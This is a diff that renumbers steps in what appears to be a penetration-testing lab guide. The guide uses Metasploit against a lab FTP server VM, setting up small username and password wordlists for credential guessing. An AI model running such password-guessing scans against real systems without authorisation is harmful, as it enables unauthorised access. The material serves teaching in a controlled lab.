@@ -213,33 +213,33 @@ run
 > On Host PC, power on the web-server2 VM which has a FTP server running on it
 
 **On Kali VM**
-6. On Metasploit, view the information about the `ftp_version` module and select it
+1. On Metasploit, view the information about the `ftp_version` module and select it
 ```
 info auxiliary/scanner/ftp/ftp_version
 use auxiliary/scanner/ftp/ftp_version
 ```
-7. Type `show options` to view options to be set
-8. Set web-server2 VM as the remote host
-9. In another terminal, create a file `/tmp/ftpuserlist` that contains possible FTP usernames
+2. Type `show options` to view options to be set
+3. Set web-server2 VM as the remote host
+4. In another terminal, create a file `/tmp/ftpuserlist` that contains possible FTP usernames
 ```
 user 
 student
 student00
 anonymous
 ```
-10. In the terminal, create a file `/tmp/ftppasslist` that contains possible FTP passwords
+5. In the terminal, create a file `/tmp/ftppasslist` that contains possible FTP passwords
 ```
 password
 12345678
 student
 student00
 ```
-11. Back in Metasploit, set it to use the username and password files just created:
+6. Back in Metasploit, set it to use the username and password files just created:
 ```
 set USER_FILE /tmp/ftpuserlist
 set PASS_FILE /tmp/ftppasslist
 ```
-12. Run the scan:
+7. Run the scan:
 ```
 run
 ```
